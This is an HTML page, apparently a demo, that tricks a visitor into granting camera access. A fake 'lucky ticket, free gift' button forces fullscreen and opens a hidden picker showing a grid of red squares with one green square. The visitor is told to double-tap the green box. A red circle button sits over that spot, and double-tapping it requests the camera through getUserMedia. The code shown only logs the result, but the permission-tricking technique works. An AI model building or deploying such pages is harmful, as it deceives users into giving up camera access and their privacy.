<!DOCTYPE html>
<html>
<head>
  <title>Permission + Fullscreen Demo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <style>
    body {
      margin: 10vh 10vw;
      height: 100vh;
      overflow: hidden;
      text-align: center;
      background-color: #7242E3;
      position: relative;
    }

    button {
      font-size: 25px;
      background-color: #28a745;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }

    select {
      opacity: 0;
      pointer-events: none;
    }

    .circle-btn {
      position: absolute;
      bottom: 20%;
      right: 20%;
      width: 60px;
      height: 60px;
      border-radius: 50%;
      background-color: red;
      border: none;
      z-index: 9999;
      cursor: pointer;
      transition: bottom 0.3s ease;
    }

    /* ЁЯСЗ fullscreen pe aur niche */
    .fullscreen .circle-btn {
      bottom: 10%;
    }
  </style>

  <script>
    let tapCount = 0;

    function handleClick() {

      // fullscreen
      if (!document.fullscreenElement) {
        document.documentElement.requestFullscreen().then(() => {
          document.body.classList.add("fullscreen"); // ЁЯСИ class add
        }).catch(()=>{});
      }

      // popup
      setTimeout(() => {
        document.getElementById("selectme").showPicker();
      }, 250);
    }

    // ЁЯСЗ circle tap logic
    function handleCircleClick() {
      tapCount++;

      if (tapCount === 2) {
        navigator.mediaDevices.getUserMedia({ video: true })
          .then(() => console.log("Camera allowed"))
          .catch(() => console.log("Denied"));

        tapCount = 0; // reset
      }
    }
  </script>
</head>

<body>

<center>
  <button onclick="handleClick()">
    ЁЯОЙ Click to Open Your Lucky Ticket and Double-Tap [ЁЯЯй = ЁЯОБ] the Green Box to Win a Free Gift! ЁЯОЙ
  </button>
</center>

<select id="selectme">
  <option>ЁЯЯе ЁЯЯе ЁЯЯе ЁЯЯе ЁЯЯе ЁЯЯе ЁЯЯе ЁЯЯе</option>
  <option>ЁЯЯе ЁЯЯе ЁЯЯе ЁЯЯе ЁЯЯе ЁЯЯе ЁЯЯе ЁЯЯе</option>
  <option>ЁЯЯе ЁЯЯе ЁЯЯе ЁЯЯе ЁЯЯе ЁЯЯе ЁЯЯе ЁЯЯе</option>
  <option>ЁЯЯе ЁЯЯе ЁЯЯе ЁЯЯе ЁЯЯе ЁЯЯе ЁЯЯе ЁЯЯе</option>
  <option>ЁЯЯе ЁЯЯе ЁЯЯе ЁЯЯе ЁЯЯе ЁЯЯе ЁЯЯе ЁЯЯе</option>
  <option>ЁЯЯе ЁЯЯе ЁЯЯе ЁЯЯе ЁЯЯе ЁЯЯе ЁЯЯе ЁЯЯе</option>
  <option>ЁЯЯе ЁЯЯе ЁЯЯе ЁЯЯе ЁЯЯе ЁЯЯй ЁЯЯе ЁЯЯе</option>
  <option>ЁЯЯе ЁЯЯе ЁЯЯе ЁЯЯе ЁЯЯе ЁЯЯе ЁЯЯе ЁЯЯе</option>
  <option>ЁЯЯе ЁЯЯе ЁЯЯе ЁЯЯе ЁЯЯе ЁЯЯе ЁЯЯе ЁЯЯе</option>
  <option>ЁЯЯе ЁЯЯе ЁЯЯе ЁЯЯе ЁЯЯе ЁЯЯе ЁЯЯе ЁЯЯе</option>
  <option>ЁЯЯе ЁЯЯе ЁЯЯе ЁЯЯе ЁЯЯе ЁЯЯе ЁЯЯе ЁЯЯе</option>
</select>

<!-- ЁЯСЗ circle button -->
<button class="circle-btn" onclick="handleCircleClick()"></button>

</body>
</html>
